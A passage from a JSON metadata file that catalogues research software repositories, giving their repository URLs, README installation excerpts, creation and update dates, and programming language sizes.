                    "value": "A preprint version: https://arxiv.org/abs/2207.09021 \n",
                    "original_header": "Paper"
                },
                "confidence": 0.9861817130287298,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/NetManAIOps/DejaVu/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "https://github.com/lizeyan/train-ticket\n \n",
                    "original_header": "Deployment and Failure Injection Scripts of Train-Ticket"
                },
                "confidence": 0.9986570089006949,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/NetManAIOps/DejaVu/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-03-18T06:42:15Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-12T01:57:04Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 3821314
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 344781
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1554
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "26": {
        "filename": "WeiFoo_RevisitUnsupervised_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/WeiFoo/RevisitUnsupervised",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\r\n\r\n```\r\n.\r\n\u251c\u2500\u2500 LICENSE\r\n\u251c\u2500\u2500 README.md\r\n\u2514\u2500\u2500 jit\r\n    \u251c\u2500\u2500 input   ## input data\r\n    \u2502\u00a0\u00a0 \u251c\u2500\u2500 bugzilla.csv\r\n    \u2502\u00a0\u00a0 \u251c\u2500\u2500 columba.csv\r\n    \u2502\u00a0\u00a0 \u251c\u2500\u2500 jdt.csv\r\n    \u2502\u00a0\u00a0 \u251c\u2500\u2500 mozilla.csv\r\n    \u2502\u00a0\u00a0 \u251c\u2500\u2500 platform.csv\r\n    \u2502\u00a0\u00a0 \u2514\u2500\u2500 postgres.csv\r\n    \u251c\u2500\u2500 output  ## reuslts are saved here accordingly\r\n    \u2502\u00a0\u00a0 \u251c\u2500\u2500 cross-project\r\n    \u2502\u00a0\u00a0 \u251c\u2500\u2500 cross-validation\r\n    \u2502\u00a0\u00a0 \u2514\u2500\u2500 cross-validation-timewise\r\n    \u2514\u2500\u2500 script_r\r\n        \u251c\u2500\u2500 ReportResults.r\r\n        \u251c\u2500\u2500 core.r\r\n        \u251c\u2500\u2500 evaluate.r \r\n        \u251c\u2500\u2500 exeMain.r  ## the start point of R code\r\n        \u251c\u2500\u2500 learner.r  ## learners are called here\r\n        \u251c\u2500\u2500 packages\r\n        \u2502\u00a0\u00a0 \u251c\u2500\u2500 EMImputation1.0.1.zip\r\n        \u2502\u00a0\u00a0 \u251c\u2500\u2500 RBFNetwork1.0.8.zip\r\n        \u2502\u00a0\u00a0 \u251c\u2500\u2500 citationKNN1.0.1.zip\r\n        \u2502\u00a0\u00a0 \u251c\u2500\u2500 conjunctiveRule1.0.4.zip\r\n        \u2502\u00a0\u00a0 \u251c\u2500\u2500 gaussianProcesses1.0.1.zip\r\n        \u2502\u00a0\u00a0 \u251c\u2500\u2500 grading1.0.1.zip\r\n        \u2502\u00a0\u00a0 \u251c\u2500\u2500 gridSearch1.0.7.zip\r\n        \u2502\u00a0\u00a0 \u251c\u2500\u2500 gridSearch1.0.8.zip\r\n        \u2502\u00a0\u00a0 \u251c\u2500\u2500 gridSearch1.0.9.zip\r\n        \u2502\u00a0\u00a0 \u251c\u2500\u2500 isotonicRegression1.0.1.zip\r\n        \u2502\u00a0\u00a0 \u251c\u2500\u2500 kernelLogisticRegression1.0.0.zip\r\n        \u2502\u00a0\u00a0 \u251c\u2500\u2500 lazyBayesianRules1.0.1.zip\r\n        \u2502\u00a0\u00a0 \u251c\u2500\u2500 leastMedSquared1.0.1.zip\r\n        \u2502\u00a0\u00a0 \u251c\u2500\u2500 linearForwardSelection1.0.1.zip\r\n        \u2502\u00a0\u00a0 \u251c\u2500\u2500 multiBoostAB1.0.1.zip\r\n        \u2502\u00a0\u00a0 \u251c\u2500\u2500 paceRegression1.0.1.zip\r\n        \u2502\u00a0\u00a0 \u251c\u2500\u2500 partialLeastSquares1.0.4.zip\r\n        \u2502\u00a0\u00a0 \u251c\u2500\u2500 racedIncrementalLogitBoost1.0.1.zip\r\n        \u2502\u00a0\u00a0 \u251c\u2500\u2500 ridor1.0.1.zip\r\n        \u2502\u00a0\u00a0 \u251c\u2500\u2500 rotationForest1.0.2.zip\r\n        \u2502\u00a0\u00a0 \u251c\u2500\u2500 stackingC1.0.1.zip\r\n        \u2502\u00a0\u00a0 \u2514\u2500\u2500 userClassifier1.0.3.zip\r\n        \u251c\u2500\u2500 results\r\n        \u2514\u2500\u2500 utils.R \r\n```\r\n\r\n\r\n \n",
                    "original_header": "Folder Structure"
                },
                "confidence": 0.9941299882429013,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/WeiFoo/RevisitUnsupervised/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2017-06-13T16:53:19Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2019-08-29T14:09:14Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 57672
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "27": {
        "filename": "PERC-Lab_Fine_Grained_Localization_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/PERC-Lab/Fine_Grained_Localization",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\u203c\ufe0f Note that this repo is a Work In Progress as we update it with models and scripts \u203c\ufe0f\n \n",
                    "original_header": "Fine_Grained_Localization"
                },
                "confidence": 0.9722612883061384,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/PERC-Lab/Fine_Grained_Localization/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-04-05T07:02:55Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-04-19T18:09:11Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 41126
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "28": {
        "filename": "JohnnyPeng18_TypeGen_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/JohnnyPeng18/TypeGen",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Clone this repo and run the following command in the root directory of this repo:\n\n```sh\npip install -r requirements.txt\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Install",
                    "parent_header": [
                        "TypeGen"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/JohnnyPeng18/TypeGen/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Remove the option `-c` if COT prompt is not used. \n**For cloze-style approaches:**\n```\npython typegen/typegen.py -s predictions.json -t testset_transformed.json -n\n```\n \n",
                    "original_header": "Evaluate"
                },
                "confidence": 0.9185148442898146,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/JohnnyPeng18/TypeGen/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To remove COT prompts, you can set the option `-c`, such as\n```\npython typegen/typegen.py -s data -r predictions.json -c\n```\nTo remove type hints, you can set the option `-u`, such as\n```\npython typegen/typegen.py -s data -r predictions.json -u\n```\nTo use original code instead of code slices, you can set the option `-o`, such as\n```\npython typegen/typegen.py -s data -r predictions.json -o\n```\n \n",
                    "original_header": "Baselines"
                },
                "confidence": 0.9926164235779843,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/JohnnyPeng18/TypeGen/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "If you want to use TypeGen in new datasets, you should prepare the data files required by TypeGen in `config.py`. \nIf you want to use fixed demonstrations, you also need to prepare `fixed_examples.json`. \nYou can use the following command to generate `testset_source.json` and `trainset_source.json`:\n```\npython typegen/preprocess.py -s testset.json/trainset.json -c\n```\n \nYou can use the following command to generate `testset_transformed.json` and `trainset_transformed.json`:\n```\npython typegen/preprocess.py -s testset.json/trainset.json -t\n```\n \nYou can use HiTyper to collect the available usertypes and generate `testset_usertypes.json` and `trainset_usertypes.json`, please follow the instructions in [HiTyper](https://github.com/JohnnyPeng18/HiTyper). \nYou can use the following command to generate `testset_staticsliced_hop[HOP].json` and `trainset_staticsliced_hop[HOP].json`:\n```\npython typegen/slice.py -s testset_source.json/trainset_source.json -p [HOP]\n```\n \nYou can use the following command to generate `trainset_cots_hop[HOP].json`:\n```\npython typegen/cot.py -s trainset.json -p [HOP]\n```\n \n",
                    "original_header": "New Dataset"
                },
                "confidence": 0.9957497243467294,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/JohnnyPeng18/TypeGen/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-07-18T08:35:04Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-21T17:37:37Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 112382
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "29": {
        "filename": "NAIST-SE_GHSponsors_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/NAIST-SE/GHSponsors",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-01-12T08:12:51Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-23T09:21:50Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "30": {
        "filename": "hanada31_ICC-Resolution-Evaluation_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/hanada31/ICC-Resolution-Evaluation",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-08-27T05:39:08Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-02-03T01:10:43Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 8517
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "31": {
        "filename": "martinezmatias_dat-experimental-results_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/martinezmatias/dat-experimental-results",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-06-28T08:15:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-03-23T14:54:24Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "32": {
        "filename": "khesoem_Defects4J-Plus-M_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/khesoem/Defects4J-Plus-M",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\tRoot Folder\n\t|\n\t|--- Chart\n\t    |--- 1\n\t        |--- Metrics.zip\n\t        |--- TestCoverage.zip\n\t|--- Closure\n\t|--- Land\n\t|--- Math\n\t|--- Time \n",
                    "original_header": "Data"
                },
                "confidence": 0.9505573652875132,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/khesoem/Defects4J-Plus-M/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-06-26T21:32:26Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-23T12:30:20Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "33": {
        "filename": "ulyantsev_EFSM-tools_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ulyantsev/EFSM-tools",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "LTL properties, or LTL formulae, are represented as text files. Each line represents a single LTL formula. Formulae may use temporal operators X (next), F (future), G (globally), U (until), R (release), Boolean operators \"&&\" (and), \"||\" (or), \"!\" (not), and atomic propositions *event(&lt;event name or a comma-separated list of event names&gt;)*, *action(&lt;action name&gt;)*, *variable(&lt;variable name&gt;)*. \n",
                    "original_header": "Input data format for LTL properties"
                },
                "confidence": 0.9997337939908222,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ulyantsev/EFSM-tools/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "It uses incremental cryptominisat by default, but switching to usual versions of cryptominisat or lingeling are possible using command line options. To run the tool: \n> cd examples \n",
                    "original_header": "Mealy machine synthesis from traces and LTL properties based on incremental SAT solvers"
                },
                "confidence": 0.975234735389455,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ulyantsev/EFSM-tools/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Run the following tool: \n",
                    "original_header": "Mealy machine synthesis from traces and LTL properties based on SAT and QSAT solvers"
                },
                "confidence": 0.9269093628562352,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ulyantsev/EFSM-tools/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Here are scripts to run some examples: \n",
                    "original_header": "Moore machine synthesis from traces and LTL properties"
                },
                "confidence": 0.9005075916320626,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ulyantsev/EFSM-tools/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Regarding issues with the tool, bugs, etc., email Igor Buzhinsky.\n \n",
                    "original_header": "Troubleshooting, questions, research collaboration, etc."
                },
                "confidence": 0.9604426559294641,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ulyantsev/EFSM-tools/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2014-03-15T16:00:44Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-25T07:26:00Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 3430934
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 1433860
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 867024
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 339889
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "SuperCollider",
                    "name": "SuperCollider",
                    "type": "Programming_language",
                    "size": 132694
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 73512
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 54737
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 38792
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Roff",
                    "name": "Roff",
                    "type": "Programming_language",
                    "size": 14257
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Gnuplot",
                    "name": "Gnuplot",
                    "type": "Programming_language",
                    "size": 8347
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 1164
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 891
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "34": {
        "filename": "kleincup_DGMS_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ryderling/DGMS",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-01-21T12:58:38Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-28T04:58:45Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 27439
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "35": {
        "filename": "PrivacyEngineering_janus-period-tracking-app_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/PrivacyEngineering/janus-period-tracking-app",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-09-30T09:02:35Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-07-06T13:49:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 28620
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 1895
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 215
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 71
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "36": {
        "filename": "rasheedja_PropaFP_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/rasheedja/PropaFP",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "- Download/Clone this repository\n- cd into the repo\n- Run `stack build`\n\nStack will then build the project and state where the PropaFP executables have been placed.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "PropaFP"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/rasheedja/PropaFP/master/README.md"
            },
            {
                "result": {
                    "value": "Currently, PropaFP supports:\n\n- [dReal4](https://github.com/dreal/dreal4) (Tested on v4.21.06.2)\n- [LPPaver](https://github.com/rasheedja/LPPaver) (Tested on v0.1.0.0)\n- [MetiTarski](https://www.cl.cam.ac.uk/~lp15/papers/Arith/) (Tested on v2.4)\n",
                    "type": "Text_excerpt",
                    "original_header": "Supported Provers",
                    "parent_header": [
                        "PropaFP",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/rasheedja/PropaFP/master/README.md"
            },
            {
                "result": {
                    "value": "[A guided example of using PropaFP with GNAT Studio.](sparkFiles/EXAMPLE.md)\n",
                    "type": "Text_excerpt",
                    "original_header": "Guided Example",
                    "parent_header": [
                        "PropaFP"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/rasheedja/PropaFP/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "[1]: https://en.wikipedia.org/wiki/SPARK_(programming_language)\n[2]: https://en.wikipedia.org/wiki/Ada_(programming_language)\n \n",
                    "original_header": "PropaFP"
                },
                "confidence": 0.9998920450984821,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/rasheedja/PropaFP/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-06-23T18:42:03Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-02T20:32:32Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Haskell",
                    "name": "Haskell",
                    "type": "Programming_language",
                    "size": 229204
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "37": {
        "filename": "Biruk-Asmare_data_acess_performance_antipatterns_in_data_intensive_systems_RR_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Biruk-Asmare/data_acess_performance_antipatterns_in_data_intensive_systems_RR",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-05-31T02:28:52Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-05-31T02:28:52Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "38": {
        "filename": "mbafrani_PMSD_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/mbafrani/PMSD",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-05-28T12:12:04Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-04-07T22:50:18Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 423337
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 151668
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 47024
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 19721
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Standard ML",
                    "name": "Standard ML",
                    "type": "Programming_language",
                    "size": 8584
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Roff",
                    "name": "Roff",
                    "type": "Programming_language",
                    "size": 5897
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 226
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "39": {
        "filename": "LittleYUYU_CoaCor_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/LittleYUYU/CoaCor",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "**UPDATE 04/20/2020** \nPlease decompress the \"data/source.tar\" file as folder `data/source/`.\nThe folder contains data from:\n- StaQC data: provided by [Yao et al., WWW'18](https://github.com/LittleYUYU/StackOverflow-Question-Code-Dataset). \n- DEV/EVAL set: provided by [Iyer et al., ACL'16](https://github.com/sriniiyer/codenn). \n",
                    "original_header": "Source Data"
                },
                "confidence": 0.9994321364252382,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/LittleYUYU/CoaCor/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-09-23T00:07:44Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-13T07:41:17Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 193387
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1559
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "40": {
        "filename": "carlos-molina_contraval_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/carlos-molina/contraval",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "The directions for installation of epromela are documented in\nthe [UserGuide_v1.2.pdf](./UserGuide_v1.2.pdf) file. The document\nalso includes examples that demonstrate its operation. The reader\nis expected to have some basic knowledge of \n[SPIN and Promela](http://spinroot.com/spin/whatispin.html) and\na local computer to dowload and deploy them.\n",
                    "type": "Text_excerpt",
                    "original_header": "3. Installation"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/carlos-molina/contraval/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\nIf you are a developer interested in building\nrealiable smart contracts, we suggest the following approach: \n",
                    "original_header": "Smart contract models"
                },
                "confidence": 0.9838479201412775,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/carlos-molina/contraval/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Feel free to email \n[carlos.molina + @ + cl.cam.a.uk](mailto:carlos.molina@cl.cam.ac.uk) \nif you have comments, bugs to report or questions. \n",
                    "original_header": "6. Bug reporting and comments"
                },
                "confidence": 0.9758964656360553,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/carlos-molina/contraval/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2013-05-25T22:09:35Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-11-27T09:50:59Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "41": {
        "filename": "CoderPat_structured-neural-summarization_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/CoderPat/structured-neural-summarization",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Experiments are based around the `train_and_eval.py` script. Besides the main experiments, this repo also contains the following folders: \n",
                    "original_header": "Structured Neural Summarization"
                },
                "confidence": 0.9098700428240925,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/CoderPat/structured-neural-summarization/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-03-12T14:15:14Z",
                    "type": "Date"
                },
                "confidence": 1,
